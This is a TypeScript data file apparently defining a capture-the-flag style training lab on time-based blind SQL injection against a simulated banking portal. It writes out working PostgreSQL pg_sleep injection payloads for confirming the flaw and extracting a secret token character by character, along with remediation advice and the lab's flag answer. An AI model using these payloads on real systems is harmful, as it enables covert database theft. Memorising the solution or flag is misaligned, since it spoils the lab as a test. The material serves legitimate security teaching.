import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab5Metadata: LabMetadata = {
  slug: 'sqli-time-based',
  title: 'SQL Injection: Time-Based Blind',
  ar_title: 'حقن SQL: الأعمى القائم على الوقت',
  description:
    'No errors. No content changes. Only timing. Use pg_sleep() to extract data when there is zero visual feedback from the application.',
  ar_description:
    'لا أخطاء. لا تغييرات في المحتوى. فقط التوقيت. استخدم pg_sleep() لاستخراج البيانات عندما لا يوجد أي تغذية راجعة بصرية من التطبيق.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: ['Time-Based Blind SQLi', 'pg_sleep', 'Timing Oracle', 'Conditional Delays'],
  xpReward: 300,
  pointsReward: 150,
  duration: 60,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,
  environmentType: 'BANKING_DASHBOARD',
  canonicalConceptId: 'sqli-blind',

  goal: 'Extract the admin secret token from the database using only timing delays — no errors, no content leaks.',
  ar_goal: 'استخرج رمز الأدمن السري من قاعدة البيانات باستخدام تأخيرات التوقيت فقط — لا أخطاء، لا تسريبات محتوى.',

  missionBrief: {
    codename: 'SILENT CLOCK',
    classification: 'TOP_SECRET',
    objective: 'A banking portal account lookup returns identical 200 responses for found/not-found — no data, no errors. But the SQL query is vulnerable. Use conditional pg_sleep() to ask yes/no questions via response time.',
    ar_objective: 'بوابة بنكية لبحث الحسابات تُعيد استجابات 200 متطابقة للموجود/غير الموجود — لا بيانات، لا أخطاء. لكن استعلام SQL ضعيف. استخدم pg_sleep() الشرطي لطرح أسئلة نعم/لا عبر وقت الاستجابة.',
    background: 'Time-based injection is the last resort when nothing else leaks. A delay of 3+ seconds = TRUE. Instant response = FALSE.',
    successCriteria: [
      'Confirm time-based injection using IF/CASE + pg_sleep(3)',
      'Enumerate the token length',
      'Extract each character via timing oracle',
      'Reconstruct the full token and get the flag',
    ],
    warningNote: 'Real-world time-based attacks take hours. This lab simulates instantaneous timing for educational purposes.',
  },

  labInfo: {
    vulnType: 'Time-Based Blind SQL Injection',
    ar_vulnType: 'حقن SQL الأعمى القائم على الوقت',
    cweId: 'CWE-89',
    cvssScore: 7.5,
    description: 'When no data or error is reflected, attackers use conditional time delays. If the database sleeps, the condition is true. The response time becomes the data channel.',
    ar_description: 'عندما لا تنعكس بيانات أو أخطاء، يستخدم المهاجمون تأخيرات زمنية مشروطة. إذا نامت قاعدة البيانات، الشرط صحيح. يصبح وقت الاستجابة قناة البيانات.',
    whatYouLearn: [
      'How to use CASE WHEN + pg_sleep() for conditional delays',
      'How to enumerate data length via timing',
      'How to extract characters through a timing oracle',
      'Why response time normalization matters in real attacks',
    ],
    techStack: ['Node.js', 'PostgreSQL', 'pg_sleep'],
  },

  briefing: {
    en: `SecureBank's account lookup API returns exactly the same response whether the account exists or not.\nNo errors. No content differences.\nYou have no oracle... or do you?\nEvery database query takes time. Make it sleep when the condition is true.\nYour stopwatch is your only tool.`,
    ar: `واجهة برمجة البحث عن الحسابات في SecureBank تُعيد نفس الاستجابة تماماً سواء كان الحساب موجوداً أم لا.\nلا أخطاء. لا اختلافات في المحتوى.\nليس لديك oracle... أم لديك؟\nكل استعلام قاعدة بيانات يستغرق وقتاً. اجعلها تنام عندما يكون الشرط صحيحاً.\nساعتك الإيقافية هي أداتك الوحيدة.`,
  },

  stepsOverview: {
    en: [
      'Confirm — account=1; SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END-- (3s delay = confirmed)',
      'Length — CASE WHEN LENGTH((SELECT secret_token FROM admin_tokens))=N THEN pg_sleep(3)...',
      'Extract — CASE WHEN ASCII(SUBSTRING(...,POS,1))=N THEN pg_sleep(3) ELSE pg_sleep(0) END--',
    ],
    ar: [
      'تأكيد — account=1; SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END-- (تأخير 3 ثوانٍ = تأكيد)',
      'الطول — CASE WHEN LENGTH((SELECT secret_token FROM admin_tokens))=N THEN pg_sleep(3)...',
      'استخراج — CASE WHEN ASCII(SUBSTRING(...,POS,1))=N THEN pg_sleep(3) ELSE pg_sleep(0) END--',
    ],
  },

  solution: {
    context: 'Account lookup: SELECT * FROM accounts WHERE account_id = $input',
    vulnerableCode: "SELECT * FROM accounts WHERE account_id = '$input'",
    exploitation: "1; SELECT CASE WHEN (SELECT secret_token FROM admin_tokens LIMIT 1)='FLAG{...}' THEN pg_sleep(3) ELSE pg_sleep(0) END--",
    steps: {
      en: [
        '1; SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END-- → ~3s delay = confirmed',
        "1; SELECT CASE WHEN LENGTH((SELECT secret_token FROM admin_tokens LIMIT 1))=32 THEN pg_sleep(3) ELSE pg_sleep(0) END--",
        "Extract each char: ASCII(SUBSTRING((SELECT secret_token FROM admin_tokens LIMIT 1),POS,1))=N → 3s = match",
      ],
      ar: [
        '1; SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END-- → تأخير ~3 ثوانٍ = تأكيد',
        "1; SELECT CASE WHEN LENGTH((SELECT secret_token FROM admin_tokens LIMIT 1))=32 THEN pg_sleep(3) ELSE pg_sleep(0) END--",
        "استخرج كل حرف: ASCII(SUBSTRING((SELECT secret_token...),POS,1))=N → 3 ثوانٍ = تطابق",
      ],
    },
    fix: [
      'Parameterized queries: WHERE account_id = $1',
      'Cast input to integer',
      'Block pg_sleep and similar functions via WAF',
      'Implement query timeouts',
    ],
  },

  postSolve: {
    explanation: {
      en: 'Time-based SQLi uses conditional delays as a binary communication channel. 3-second delay = true, instant = false. Combined with ASCII() and SUBSTRING(), every character of any value can be extracted.',
      ar: 'يستخدم حقن SQL القائم على الوقت التأخيرات الشرطية كقناة اتصال ثنائية. تأخير 3 ثوانٍ = صحيح، فوري = خاطئ. مع ASCII() و SUBSTRING()، يمكن استخراج كل حرف من أي قيمة.',
    },
    impact: {
      en: 'Full database extraction with zero error or content leakage. The only observable side-effect is latency.',
      ar: 'استخراج كامل لقاعدة البيانات مع صفر تسريب للأخطاء أو المحتوى. التأثير الجانبي الوحيد الملاحظ هو الكمون.',
    },
    fix: ['Parameterized queries', 'Integer casting', 'DB function whitelisting', 'Query timeout policies'],
  },

  hints: [
    {
      order: 1,
      xpCost: 20,
      content: "Confirm time-based injection using a conditional sleep:\n  account=1; SELECT CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END--\nIf the response takes ~3 seconds, injection is confirmed. Compare with:\n  account=1; SELECT CASE WHEN 1=2 THEN pg_sleep(3) ELSE pg_sleep(0) END-- (instant)",
    },
    {
      order: 2,
      xpCost: 35,
      content: "Find the token length:\n  1; SELECT CASE WHEN LENGTH((SELECT secret_token FROM admin_tokens LIMIT 1))=32 THEN pg_sleep(3) ELSE pg_sleep(0) END--\nTry different values (16, 24, 32, 40...) until you get the 3-second delay.",
    },
    {
      order: 3,
      xpCost: 50,
      content: "Extract characters via timing:\n  1; SELECT CASE WHEN ASCII(SUBSTRING((SELECT secret_token FROM admin_tokens LIMIT 1),1,1))=70 THEN pg_sleep(3) ELSE pg_sleep(0) END--\nASCII 70='F'. Repeat for each position. 3s = match, instant = try next value.",
    },
  ],

  flagAnswer: 'FLAG{SQLI_TIME_BASED_SUCCESS}',
  initialState: {
    admin_tokens: [{ id: 1, secret_token: 'FLAG{SQLI_TIME_BASED_SUCCESS}' }],
  },
};
